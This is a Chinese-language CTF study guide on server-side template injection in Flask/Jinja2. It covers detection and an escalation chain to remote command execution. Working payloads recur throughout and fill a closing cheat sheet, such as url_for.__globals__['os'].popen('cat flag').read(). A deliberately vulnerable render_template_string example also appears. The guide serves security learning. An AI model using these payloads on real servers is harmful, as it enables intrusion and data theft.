# SSTI（Server-Side Template Injection，服务器端模板注入）

## 1. 什么是 SSTI

SSTI，全称 **Server-Side Template Injection**，中文叫 **服务器端模板注入**。

它的本质是：

> 用户输入被服务端当作“模板语法”解析并执行，而不是仅仅当作普通字符串显示。

很多 Web 框架都会使用模板引擎来生成 HTML 页面。  
例如：

- Python / Flask → Jinja2
- Python / Django → Django Template
- Java → Thymeleaf
- Node.js → EJS / Pug / Handlebars

正常情况下，用户输入只是作为变量传给模板，例如：

```python
from flask import render_template

@app.route("/")
def index():
    name = request.args.get("name")
    return render_template("index.html", name=name)
````

模板中：

```html
<h1>Hello {{ name }}</h1>
```

这里的 `name` 只是变量，正常来说不会被再次解析。

但如果程序员错误地把用户输入直接当模板渲染，例如：

```python
from flask import render_template_string

@app.route("/")
def index():
    user_input = request.args.get("name")
    return render_template_string(user_input)
```

这时，如果用户输入：

```jinja2
{{7*7}}
```

服务端就会把它当模板执行，返回：

```text
49
```

这就是 SSTI。

---

## 2. SSTI 的危害

SSTI 的危险性很高，因为它往往不仅仅是“页面显示异常”，而是可能进一步导致：

* 读取服务端变量
* 泄露配置文件
* 泄露密钥、环境变量
* 执行系统命令
* 获取 WebShell / RCE（远程命令执行）

也就是说，SSTI 在很多题里最后目标是：

> 从“模板表达式执行”一路打到“命令执行”。

---

## 3. 为什么会出现 SSTI

根本原因是：

> 程序把**不可信的用户输入**当成模板代码来解释。

常见危险写法：

```python
render_template_string(user_input)
```

或者：

```python
template = f"Hello {user_input}"
render_template_string(template)
```

或者开发者把模板内容拼接起来，再让模板引擎解析。

---

## 4. 常见模板引擎与语法特征

不同模板引擎的表达式语法略有不同。

### Jinja2（Flask 常见）

```jinja2
{{ 7*7 }}
```

### Twig（PHP）

```twig
{{ 7*7 }}
```

### Smarty（PHP）

```smarty
{php}phpinfo();{/php}
```

### Django Template

```django
{{ variable }}
```

在 CTF 中，最常遇到的是：

* **Flask + Jinja2**
* 所以做 picoCTF / BUUCTF Web 题时，看到 Python、Flask、templating，优先考虑 **Jinja2 SSTI**

---

## 5. 如何判断是否存在 SSTI

### 方法一：输入数学表达式

最经典测试：

```jinja2
{{7*7}}
```

如果返回：

```text
49
```

说明模板表达式被执行了。

这通常就是 SSTI。

---

### 方法二：输入无害对象探测

例如：

```jinja2
{{config}}
```

如果返回了一堆配置项，说明当前模板引擎很可能是 Flask/Jinja2。

---

### 方法三：观察报错信息

如果输入一些模板语法后，页面报错中出现：

* jinja2
* template
* render_template
* TemplateSyntaxError

那也是非常强的提示。

---

## 6. Jinja2 SSTI 基础

在 Flask/Jinja2 中，常见测试 payload：

```jinja2
{{7*7}}
```

```jinja2
{{config}}
```

```jinja2
{{request}}
```

```jinja2
{{url_for.__globals__}}
```

这些 payload 的作用：

* `{{7*7}}`：验证表达式是否执行
* `{{config}}`：查看 Flask 配置
* `{{request}}`：查看请求对象
* `{{url_for.__globals__}}`：尝试进入 Python 全局命名空间

---

## 7. 为什么 Jinja2 能进一步利用

Jinja2 运行在 Python 环境中。
如果我们能从模板对象一路访问到底层 Python 对象，就有可能：

* 获取类
* 遍历继承链
* 找到危险函数
* 执行命令

这也是 Jinja2 SSTI 最经典的利用路线。

---

## 8. 常见利用思路（CTF 角度）

### 8.1 探测对象类型

```jinja2
{{ ''.__class__ }}
```

作用：

* `''` 是一个字符串对象
* `.__class__` 取它的类

返回通常类似：

```text
<class 'str'>
```

---

### 8.2 查看继承链

```jinja2
{{ ''.__class__.__mro__ }}
```

`__mro__` 表示方法解析顺序（Method Resolution Order），本质上可以理解为“这个类往上继承到哪些父类”。

通常会看到类似：

```text
(<class 'str'>, <class 'object'>)
```

这里关键是最终可以摸到 Python 的基类：

```python
object
```

---

### 8.3 枚举所有子类

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

这里的思路是：

* `''.__class__` → `str`
* `.__mro__[1]` → `object`
* `object.__subclasses__()` → 所有继承自 object 的类

这样就能看到大量 Python 内部类。

---

### 8.4 找危险类 / 函数

在很多旧题里，会进一步去找：

* `subprocess.Popen`
* `os`
* `warnings.catch_warnings`
* file 类
* import 相关对象

目的是想办法执行：

```python
os.popen('cat flag').read()
```

或者等价命令。

---

## 9. 更直接的 Jinja2 利用思路

有些题不需要走 `__subclasses__()` 那么长的链，而是可以直接利用 Flask 暴露的全局对象，例如：

```jinja2
{{ url_for.__globals__['os'].popen('id').read() }}
```

或者：

```jinja2
{{ url_for.__globals__['__builtins__'] }}
```

如果环境允许，这类写法会比 `__subclasses__()` 更简单。

常见命令包括：

```jinja2
{{ url_for.__globals__['os'].popen('ls').read() }}
```

```jinja2
{{ url_for.__globals__['os'].popen('cat flag').read() }}
```

```jinja2
{{ url_for.__globals__['os'].popen('cat /flag').read() }}
```

---

## 10. CTF 中解 SSTI 的标准流程

以后遇到 SSTI 题，可以按这个流程来：

### 第一步：验证是否可执行表达式

```jinja2
{{7*7}}
```

### 第二步：确认模板引擎 / 框架

```jinja2
{{config}}
```

```jinja2
{{request}}
```

### 第三步：尝试直接拿 globals

```jinja2
{{url_for.__globals__}}
```

### 第四步：尝试命令执行

```jinja2
{{url_for.__globals__['os'].popen('id').read()}}
```

### 第五步：寻找 flag

```jinja2
{{url_for.__globals__['os'].popen('ls').read()}}
```

```jinja2
{{url_for.__globals__['os'].popen('cat flag').read()}}
```

如果 direct payload 不行，再走：

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

去找可利用类。

---

## 11. SSTI 与 XSS 的区别

很多新手容易混。

### XSS

* 代码在 **浏览器端** 执行
* 主要是 JavaScript
* 影响客户端用户

### SSTI

* 代码在 **服务器端** 执行
* 影响服务端环境
* 往往能进一步读文件、执行命令

所以 SSTI 的危险程度通常比普通 XSS 更高。

---

## 12. SSTI 与命令执行的关系

SSTI 本身不一定一开始就等于 RCE。

更准确地说：

> SSTI 是“模板表达式执行”，在很多情况下可以继续利用到 RCE。

所以利用链一般是：

```text
用户输入
→ 模板表达式被执行
→ 获取 Python 对象访问能力
→ 调用危险函数
→ 系统命令执行
→ 读取 flag
```

---

## 13. picoCTF 中 SSTI 题的解题特征

像 picoCTF 这类题，通常会有这些暗示词：

* template
* templating
* render
* Flask
* announce whatever you want
* modular web apps

看到这些词，就要立刻想到：

> 会不会是模板注入？

然后先试：

```jinja2
{{7*7}}
```

---

## 14. 常见绕过思路（先了解）

有些题会过滤：

* `.` 点号
* `_` 下划线
* `[` `]`
* `class`
* `mro`
* `subclasses`

这时会用到绕过技巧，比如：

* `attr()` 取属性
* 字符串拼接
* 十六进制编码
* 请求参数二次传参
* 从现有对象里间接获取敏感属性

例如：

```jinja2
{{()|attr('__class__')}}
```

不过这部分先知道即可，你现在先掌握基础利用链更重要。

---

## 15. 一个最小化的理解模型

可以这样记：

```text
SSTI = 用户输入被服务端当模板执行
```

最小验证：

```jinja2
{{7*7}}
```

Jinja2 常见方向：

```text
对象 → 类 → 基类 → 所有子类 → 危险函数 → 命令执行
```

---

## 16. 做题时的实战习惯

遇到疑似 SSTI 的题：

1. 先测 `{{7*7}}`
2. 再测 `{{config}}`
3. 再测 `{{request}}`
4. 再看能不能用 `url_for.__globals__`
5. 不行再走 `__class__ → __mro__ → __subclasses__()`

不要一上来就乱试超长 payload。
先确认，再推进。

---

## 17. 一句话总结

> SSTI 就是服务端把用户输入当模板代码执行。
> 在 Flask/Jinja2 场景下，常常可以从模板表达式一路利用到 Python 对象，再到命令执行。

---

## 18. 常用 payload 速查

### 基础检测

```jinja2
{{7*7}}
```

### 查看配置

```jinja2
{{config}}
```

### 查看请求对象

```jinja2
{{request}}
```

### 查看类

```jinja2
{{ ''.__class__ }}
```

### 查看继承链

```jinja2
{{ ''.__class__.__mro__ }}
```

### 枚举子类

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### 尝试直接命令执行

```jinja2
{{ url_for.__globals__['os'].popen('id').read() }}
```

```jinja2
{{ url_for.__globals__['os'].popen('ls').read() }}
```

```jinja2
{{ url_for.__globals__['os'].popen('cat flag').read() }}
```

---

## 19. 我当前阶段该掌握到什么程度

对于现阶段 CTF 学习，掌握到下面这些就够了：

* 知道 SSTI 是什么
* 会用 `{{7*7}}` 判断
* 知道 Flask 常配 Jinja2
* 知道 `{{config}}`、`{{request}}`
* 知道 `__class__ / __mro__ / __subclasses__()` 这条利用链
* 知道最终目标通常是 `os.popen('cat flag').read()`

等后面进入 BUUCTF / 进阶 Web，再系统学绕过。

---

## 20. 练习建议

接下来可以做的事：

1. 用 picoCTF 的 SSTI 题练基础检测
2. 记录每个 payload 的返回结果
3. 自己写一遍利用链，不要只复制答案
4. 区分：

   * 这是模板注入
   * 不是 XSS
   * 不是 SQL 注入
   * 它发生在服务端

---

## 21. 关键词

```text
SSTI
Server-Side Template Injection
服务器端模板注入
Jinja2
Flask
render_template_string
__class__
__mro__
__subclasses__
RCE
```